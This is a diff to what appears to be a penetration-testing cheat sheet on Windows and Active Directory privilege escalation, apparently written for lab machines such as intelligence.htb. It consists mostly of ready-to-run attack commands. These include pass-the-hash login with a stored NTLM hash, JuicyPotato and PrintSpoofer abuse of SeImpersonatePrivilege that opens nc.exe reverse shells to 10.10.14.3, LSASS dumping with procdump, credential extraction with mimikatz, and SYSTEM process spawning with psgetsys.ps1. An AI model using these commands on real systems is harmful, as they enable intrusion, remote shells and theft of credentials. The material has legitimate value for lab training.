@@ -42,14 +42,6 @@ PassTheHash:
 evil-winrm -i 10.129.8.25 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
-### SeImpersonatePrivilege
-Explotation
-````
-c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
-OR
-c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
-````
-
 # Roles
 ## GenericAll
 Creating a Fake SPN
@@ -79,3 +71,23 @@ Configuration
 export KRB5CCNAME=$(pwd)/Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass dc.intelligence.htb
 ```
+## SeImpersonatePrivilege
+````
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+OR
+c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+````
+## SeDebugPrivilege
+Extract the file lsass.dmp
+````
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+````
+Read the file
+````
+mimikatz.exe -c "log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
+````
+Another way with [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
+In <system_pid>, get a system process with tasklist
+````
+.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"c:\Windows\System32\cmd.exe","")
+````
